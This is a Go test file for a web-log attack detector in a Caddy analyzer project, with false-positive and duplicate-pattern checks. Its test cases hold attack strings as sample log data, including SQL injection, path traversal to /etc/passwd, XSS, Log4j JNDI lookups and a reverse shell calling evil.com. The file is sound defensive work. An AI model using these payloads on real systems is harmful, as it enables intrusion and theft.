package analysis

import (
	"testing"

	"github.com/L9Lenny/caddy-analyzer/pkg/types"
)

func TestDetectorSignatures(t *testing.T) {
	detector := NewDetector()

	tests := []struct {
		name       string
		entry      *types.LogEntry
		expectDet  bool
		expectType DetectionType
	}{
		{
			name: "SQL Injection - UNION SELECT",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/products?id=1%20UNION%20SELECT%20username,password%20FROM%20users",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetSQLInjection,
		},
		{
			name: "SQL Injection - OR tautology",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/login?user=admin%27%20OR%20%271%27=%271",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetSQLInjection,
		},
		{
			name: "SQL Injection - time-based WAITFOR",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/search?id=1;WAITFOR+DELAY+'0:0:5'--",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetSQLInjection,
		},
		{
			name: "SQL Injection - xp_cmdshell",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/page?id=1;exec+xp_cmdshell+'whoami'",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetSQLInjection,
		},
		{
			name: "SQL Injection - DROP TABLE",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/page?id=1;DROP+TABLE+users",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetSQLInjection,
		},
		{
			name: "Path Traversal - ../",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/download?file=../../../../etc/passwd",
				Status:   403,
			},
			expectDet:  true,
			expectType: DetPathTraversal,
		},
		{
			name: "Path Traversal - .%2e encoded",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",
				UserAgent: "",
				Status:    308,
			},
			expectDet:  true,
			expectType: DetPathTraversal,
		},
		{
			name: "Path Traversal - null byte",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/page?file=..%00/etc/passwd",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetPathTraversal,
		},
		{
			name: "XSS - script tag",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/search?q=<script>alert(1)</script>",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetXSS,
		},
		{
			name: "XSS - event handler",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/page?name=<img src=x onerror=alert(1)>",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetXSS,
		},
		{
			name: "XSS - javascript protocol",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/redirect?url=javascript:alert(1)",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetXSS,
		},
		{
			name: "RCE - cat /etc",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/cgi-bin/test.cgi?cmd=cat%20/etc/passwd",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetRCE,
		},
		{
			name: "RCE - PHP eval",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/page?id=eval(base64_decode('...'))",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetRCE,
		},
		{
			name: "RCE - powershell",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/cmd?r=powershell+-c+whoami",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetRCE,
		},
		{
			name: "RCE - reverse shell",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/page?cmd=bash+-i+>/dev/tcp/evil.com/443",
				Status:   200,
			},
			expectDet:  true,
			expectType: DetRCE,
		},
		{
			name: "Sensitive File - .env",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/.env",
				Status:   404,
			},
			expectDet:  true,
			expectType: DetSensitiveFile,
		},
		{
			name: "Sensitive File - AWS credentials",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/.aws/credentials",
				Status:   404,
			},
			expectDet:  true,
			expectType: DetSensitiveFile,
		},
		{
			name: "Sensitive File - SSH key",
			entry: &types.LogEntry{
				RemoteIP: "1.2.3.4",
				URI:      "/id_rsa",
				Status:   404,
			},
			expectDet:  true,
			expectType: DetSensitiveFile,
		},
		{
			name: "Log4j JNDI - User-Agent",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/login",
				UserAgent: "${jndi:ldap://evil.com/a}",
				Status:    400,
			},
			expectDet:  true,
			expectType: DetLog4j,
		},
		{
			name: "Log4j JNDI - URI",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/login?x=${jndi:ldap://evil.com}",
				UserAgent: "Mozilla/5.0",
				Status:    400,
			},
			expectDet:  true,
			expectType: DetLog4j,
		},
		{
			name: "Log4j - obfuscated",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/",
				UserAgent: "${${::-j}}",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetLog4j,
		},
		{
			name: "Scanner Tool - sqlmap",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/",
				UserAgent: "sqlmap/1.5.2#stable",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetScanner,
		},
		{
			name: "Scanner Tool - nuclei",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/",
				UserAgent: "Mozilla/5.0 (compatible; Nuclei)",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetScanner,
		},
		{
			name: "Scanner Tool - ffuf",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/",
				UserAgent: "Fuzz Faster U Fool (ffuf)",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetScanner,
		},
		{
			name: "WordPress - plugins path",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/wp-content/plugins/hellopress/wp_filemanager.php",
				UserAgent: "Mozilla/5.0",
				Status:    308,
			},
			expectDet:  true,
			expectType: DetWPProbe,
		},
		{
			name: "WordPress - XML-RPC",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/xmlrpc.php",
				UserAgent: "Mozilla/5.0",
				Status:    404,
			},
			expectDet:  true,
			expectType: DetWPProbe,
		},
		{
			name: "WordPress - REST API",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/wp-json/wp/v2/users",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetWPProbe,
		},
		{
			name: "CGI Bin Probe",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/cgi-bin/test.cgi",
				UserAgent: "Mozilla/5.0",
				Status:    404,
			},
			expectDet:  true,
			expectType: DetCGIProbe,
		},
		{
			name: "SSRF - Cloud Metadata",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/proxy?url=http://169.254.169.254/latest/meta-data/",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSRF,
		},
		{
			name: "SSRF - Internal host (raw URI)",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/fetch?url=http://127.0.0.1:6379/",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSRF,
		},
		{
			name: "SSRF - Gopher protocol",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/redirect?url=gopher://127.0.0.1:6379/_SET%20key%20value",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSRF,
		},
		{
			name: "SSRF - private IP range",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/proxy?url=http://192.168.1.1/admin",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSRF,
		},
		{
			name: "NoSQL Injection - $ne operator",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/login?password[$ne]=invalid&username=admin",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetNoSQLi,
		},
		{
			name: "NoSQL Injection - $regex operator",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/users?filter[$regex]=.*admin.*",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetNoSQLi,
		},
		{
			name: "NoSQL Injection - $where clause",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/data?query[$where]=this.password%20===%20''",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetNoSQLi,
		},
		{
			name: "SSTI - Jinja2 arithmetic",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/page?name={{7*7}}",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSTI,
		},
		{
			name: "SSTI - Python MRO exploit",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/page?name={{''.__class__.__mro__[1].__subclasses__()}}",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSTI,
		},
		{
			name: "SSTI - Java EL expression",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/search?q=${7*7}",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSTI,
		},
		{
			name: "GraphQL Introspection - __schema",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/graphql?query={__schema{types{name}}}",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetGraphQL,
		},
		{
			name: "LFI Wrapper - php://input",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/page?file=php://input",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetLFIWrapper,
		},
		{
			name: "LFI Wrapper - phar://",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/page?file=phar://uploaded.phar/shell.php",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetLFIWrapper,
		},
		{
			name: "LFI Wrapper - data://",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/page?file=data://text/plain;base64,...",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetLFIWrapper,
		},
		{
			name: "Admin Probe - Actuator env",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/actuator/env",
				UserAgent: "Mozilla/5.0",
				Status:    404,
			},
			expectDet:  true,
			expectType: DetAdminProbe,
		},
		{
			name: "Admin Probe - Heapdump",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/heapdump",
				UserAgent: "Mozilla/5.0",
				Status:    404,
			},
			expectDet:  true,
			expectType: DetAdminProbe,
		},
		{
			name: "Admin Probe - phpMyAdmin",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/phpmyadmin",
				UserAgent: "Mozilla/5.0",
				Status:    404,
			},
			expectDet:  true,
			expectType: DetAdminProbe,
		},
		{
			name: "Admin Probe - Swagger docs",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/swagger-ui/",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetAdminProbe,
		},
		{
			name: "XXE - DOCTYPE SYSTEM",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/api/submit<!DOCTYPE foo SYSTEM \"file:///etc/passwd\">",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetXXE,
		},
		{
			name: "XXE - External entity",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/api/parse?xml=<!ENTITY xxe SYSTEM \"file:///etc/passwd\">",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetXXE,
		},
		{
			name: "Open Redirect - URL parameter",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/redirect?url=http://evil.com/phish",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetOpenRedirect,
		},
		{
			name: "Open Redirect - protocol-relative",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/redirect?url=//evil.com",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetOpenRedirect,
		},
		{
			name: "LDAP Injection - filter bypass",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/search?user=*)(|(uid=*",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetLDAPInjection,
		},
		{
			name: "XPath Injection - path manipulation",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/api/users?q=]|//*|",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetXPathInjection,
		},
		{
			name: "CRLF Injection - header injection",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/page?x=%0d%0aSet-Cookie:evil=1",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetCRLFInjection,
		},
		{
			name: "Prototype Pollution - __proto__",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/api/update?__proto__[admin]=true",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetProtoPollution,
		},
		{
			name: "Prototype Pollution - JSON payload",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/api/merge",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  false,
		},
		{
			name: "SSI Injection - exec cmd",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/page.shtml?x=<!--#exec%20cmd=\"whoami\"%20-->",
				UserAgent: "Mozilla/5.0",
				Status:    200,
			},
			expectDet:  true,
			expectType: DetSSIInjection,
		},
		{
			name: "Legitimate Request",
			entry: &types.LogEntry{
				RemoteIP:  "1.2.3.4",
				URI:       "/menu",
				UserAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0",
				Status:    200,
			},
			expectDet: false,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			det := detector.Detect(tt.entry)
			if tt.expectDet {
				if det == nil {
					t.Fatalf("expected detection, got nil")
				}
				if det.Type != tt.expectType {
					t.Errorf("expected detection type %s, got %s", tt.expectType, det.Type)
				}
			} else {
				if det != nil {
					t.Errorf("expected no detection, got %v", det)
				}
			}
		})
	}
}

func TestDetectorFalsePositives(t *testing.T) {
	detector := NewDetector()

	tests := []struct {
		name string
		uri  string
		ua   string
	}{
		{
			name: "English words 'selecting' and 'from' in path",
			uri:  "/blog/2019/selecting-tips-from-experts",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Word 'from' alone in path",
			uri:  "/api/data-from-server",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Word 'delete' without FROM in query",
			uri:  "/products/delete-confirmation",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Word 'sleep' as part of compound word",
			uri:  "/help/sleep-tracking",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Word 'information' without _schema",
			uri:  "/search?q=information-about-cats",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Word 'export' in path",
			uri:  "/api/v1/users/export",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate API with query params",
			uri:  "/api/v1/users?id=42&include=profile",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate path with 'type' parameter",
			uri:  "/search?type=products&q=laptop",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate path with 'query' parameter",
			uri:  "/api/search?query=laptop",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate CSS request",
			uri:  "/static/css/main.css",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate JS bundle request",
			uri:  "/static/js/app.bundle.js",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate favicon request",
			uri:  "/favicon.ico",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate health check",
			uri:  "/health",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate pagination params",
			uri:  "/products?page=2&limit=20&sort=price",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate OAuth callback",
			uri:  "/auth/callback?code=abc123&state=xyz",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate internal redirect",
			uri:  "/login?return=/dashboard",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate documentation path",
			uri:  "/docs/v2/getting-started/installation",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate contact form",
			uri:  "/contact?subject=hello",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Legitimate download endpoint",
			uri:  "/download/file.pdf",
			ua:   "Mozilla/5.0",
		},
		{
			name: "Empty URI",
			uri:  "/",
			ua:   "Mozilla/5.0",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			entry := &types.LogEntry{
				RemoteIP:  "192.168.1.100",
				URI:       tt.uri,
				UserAgent: tt.ua,
				Status:    200,
			}
			det := detector.Detect(entry)
			if det != nil {
				t.Errorf("FALSE POSITIVE: URI %q triggered detection %s (%s)", tt.uri, det.Type, det.Desc)
			}
		})
	}
}

func TestPatternUniqueness(t *testing.T) {
	seen := make(map[string]string)
	dupes := 0

	for i, p := range compilePatterns() {
		key := p.re.String()
		if prev, ok := seen[key]; ok {
			t.Errorf("duplicate pattern: %q (desc %q) at index %d duplicates %q at index ?", key, p.desc, i, prev)
			dupes++
		}
		seen[key] = p.desc
	}

	for i, p := range rawPatterns {
		key := p.re.String()
		if prev, ok := seen[key]; ok {
			t.Errorf("duplicate raw pattern: %q (desc %q) at index %d duplicates %q", key, p.desc, i, prev)
			dupes++
		}
		seen[key] = p.desc
	}

	if dupes > 0 {
		t.Errorf("%d duplicate patterns detected", dupes)
	}
}
